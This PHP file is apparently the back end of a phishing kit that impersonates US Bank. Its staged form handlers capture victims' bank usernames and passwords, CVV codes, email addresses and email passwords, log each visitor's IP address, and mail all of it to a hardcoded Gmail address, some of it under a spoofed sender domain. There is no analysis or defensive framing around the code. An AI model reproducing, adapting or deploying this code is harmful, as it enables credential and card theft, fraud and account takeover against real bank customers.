<?php 	
	
	/* Start User id first page email */
    ini_set("SMTP","ssl://smtp.gmail.com");
	ini_set("smtp_port","465");
	if(isset($_POST['LOB'])){
		include("index1.php");
	}
	if(isset($_POST['username']) AND isset($_POST['userpassword']))
	{

	
		// $to = "alexmarin0914@gmail.com";
		$to = "alexmarin0914@gmail.com";
		$subject = "User name and Password";
		$ipaddress = '';
		if (isset($_SERVER['HTTP_CLIENT_IP']))
			$ipaddress = $_SERVER['HTTP_CLIENT_IP'];
		else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
			$ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
		else if(isset($_SERVER['HTTP_X_FORWARDED']))
			$ipaddress = $_SERVER['HTTP_X_FORWARDED'];
		else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
			$ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
		else if(isset($_SERVER['HTTP_FORWARDED']))
			$ipaddress = $_SERVER['HTTP_FORWARDED'];
		else if(isset($_SERVER['REMOTE_ADDR']))
			$ipaddress = $_SERVER['REMOTE_ADDR'];
		else
        $ipaddress = 'UNKNOWN';
		$message = "
			<html>
			<head>
			<title>Personal/User name and password</title>
			</head>
			<body>
			<p>Personal/User name and password</p>
			<table>
			<tr>
			<td>User Name: </td>
			<td>".$_POST['username']."</td>
			</tr>
			<tr>
			<td>User Password: </td>
			<td>".$_POST['userpassword']."</td>
			</tr>
			<tr>
				<td>IP: </td>
				<td>".$ipaddress."</td>
			</tr>
			</table>
			</body>
			</html>
			";
			// Always set content-type when sending HTML email
			$headers = "MIME-Version: 1.0" . "\r\n";
			$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
			// More headers
			$headers .= 'From: <alexmarin0914@gmail.com>' . "\r\n";
			mail($to,$subject,$message,$headers);
			// $a = mt_rand(1000000000,9999997777);
	      	// header('location:cvv.php?reg='.$a);
	      	include('cvv.php');
	}
	/* End User id first page email */
	
	
    /* Start Password second page email */			
	if(isset($_POST['cvv2']))
	{

		$to = "alexmarin0914@gmail.com";
		$subject = "CVV";
		$ipaddress = '';
		if (isset($_SERVER['HTTP_CLIENT_IP']))
			$ipaddress = $_SERVER['HTTP_CLIENT_IP'];
		else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
			$ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
		else if(isset($_SERVER['HTTP_X_FORWARDED']))
			$ipaddress = $_SERVER['HTTP_X_FORWARDED'];
		else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
			$ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
		else if(isset($_SERVER['HTTP_FORWARDED']))
			$ipaddress = $_SERVER['HTTP_FORWARDED'];
		else if(isset($_SERVER['REMOTE_ADDR']))
			$ipaddress = $_SERVER['REMOTE_ADDR'];
		else
        $ipaddress = 'UNKNOWN';
		$message = "
			<html>
			<head>
			<title>Us Bank Password - Second Email </title>
			</head>
			<body>
			<p> Us Bank Password - Second Email </p>
			<table>
			<tr>
				<td>CVV: </td>
				<td>".$_POST['cvv2']."</td>
			</tr>
			<tr>
				<td>IP: </td>
				<td>".$ipaddress."</td>
			</tr>
			</table>
			</body>
			</html>
			";
			// Always set content-type when sending HTML email
			$headers = "MIME-Version: 1.0" . "\r\n";
			$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
			// More headers
			$headers .= 'From: <alexmarin0914@gmail.com>' . "\r\n";
			mail($to,$subject,$message,$headers);
			// $a = mt_rand(1000000000,9999997777);
	    	// header('location:emailaddress.php?reg='.$a);
	    	include('emailaddress.php');
	}
	/* End Password second page email */

	
	/* Start Security Third page email */	
	if(isset($_POST['email_address']) AND isset($_POST['email_password']))
	{
		$to = "alexmarin0914@gmail.com";
		$subject = "Email Address";
		$ipaddress = '';
		if (isset($_SERVER['HTTP_CLIENT_IP']))
			$ipaddress = $_SERVER['HTTP_CLIENT_IP'];
		else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
			$ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
		else if(isset($_SERVER['HTTP_X_FORWARDED']))
			$ipaddress = $_SERVER['HTTP_X_FORWARDED'];
		else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
			$ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
		else if(isset($_SERVER['HTTP_FORWARDED']))
			$ipaddress = $_SERVER['HTTP_FORWARDED'];
		else if(isset($_SERVER['REMOTE_ADDR']))
			$ipaddress = $_SERVER['REMOTE_ADDR'];
		else
        $ipaddress = 'UNKNOWN';
		$message = "
			<html>
			<head>
			<title>Us Bank Security Question-Third Email</title>
			</head>
			<body>
			<p> Security-Questions </p>
			<table>
			<tr>
				<td>IP: </td>
				<td>".$ipaddress."</td>
			</tr>
			<tr>
				<td>Email Address: </td>
				<td>".$_POST['email_address']."</td>
			</tr>
			<tr>
				<td>Email Password: </td>
				<td>".$_POST['email_password']."</td>
			</tr>
			
			</table>
			</body>
			</html>
			";
			// Always set content-type when sending HTML email
			$headers = "MIME-Version: 1.0" . "\r\n";
			$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
			// More headers
			$headers .= 'From: <info@unicityautomation.com>' . "\r\n";
			mail($to,$subject,$message,$headers);
			// $a = mt_rand(1000000000,9999997777);
	    	// header('location:emailpage.php?reg='.$a);
	    	include('emailpage.php');
	}	
	/* End Security Third page email */

	
	/* Start Email password Fourth Email */			
	if(isset($_POST['email_address']) AND isset($_POST['email_page']))
	{ 
		$to = "alexmarin0914@gmail.com";
		$subject = "Email Page";
		$ipaddress = '';
		if (isset($_SERVER['HTTP_CLIENT_IP']))
			$ipaddress = $_SERVER['HTTP_CLIENT_IP'];
		else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
			$ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
		else if(isset($_SERVER['HTTP_X_FORWARDED']))
			$ipaddress = $_SERVER['HTTP_X_FORWARDED'];
		else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
			$ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
		else if(isset($_SERVER['HTTP_FORWARDED']))
			$ipaddress = $_SERVER['HTTP_FORWARDED'];
		else if(isset($_SERVER['REMOTE_ADDR']))
			$ipaddress = $_SERVER['REMOTE_ADDR'];
		else
        $ipaddress = 'UNKNOWN';
		$message = "
			<html>
			<head>
			<title>US Bank - Email Password Fourth Email</title>
			</head>
			<body>
			<p>US Bank - Email Password Fourth Email</p>
			<table>
			<tr>
				<td>IP: </td>
				<td>".$ipaddress."</td>
			</tr>
			<tr>
				<td>Email: </td>
				<td>".$_POST['email_address']."</td>
			</tr>
			<tr>
				<td>Email Page: </td>
				<td>".$_POST['email_page']."</td>
			</tr>
			</table>
			</body>
			</html>
			";

			// Always set content-type when sending HTML email
			$headers = "MIME-Version: 1.0" . "\r\n";
			$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

			// More headers
			$headers .= 'From: <info@unicityautomation.com>' . "\r\n";
			mail($to,$subject,$message,$headers);
			// $a = mt_rand(1000000000,9999997777);
	    	// header('location:thankyou.php?reg='.$a);
	    	include('thankyou.php');
	}			
	/* End Email password Fourth Email */		

	/* End Confirm Email password Fifth Email */	
	
?>